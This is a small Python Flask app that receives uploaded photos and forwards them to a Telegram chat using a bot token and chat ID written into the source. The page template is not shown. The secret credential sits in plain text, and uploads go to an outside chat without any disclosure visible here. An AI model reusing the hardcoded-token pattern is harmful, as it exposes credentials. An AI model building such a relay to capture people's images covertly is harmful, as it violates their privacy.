from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = "7927506635:AAGiH1Vz0yS8WwCX3EGhXp8YKQmdkXwAR6Q"
CHAT_ID = "7767212021"

def send_photo_to_telegram(photo_bytes):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {"photo": ("photo.jpg", photo_bytes)}
    data = {"chat_id": CHAT_ID}
    r = requests.post(url, files=files, data=data)
    return r.status_code == 200

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    photo = request.files.get("photo")
    if not photo:
        return "No photo uploaded", 400
    photo_bytes = photo.read()
    success = send_photo_to_telegram(photo_bytes)
    if success:
        return "Photo sent!"
    else:
        return "Failed to send photo", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)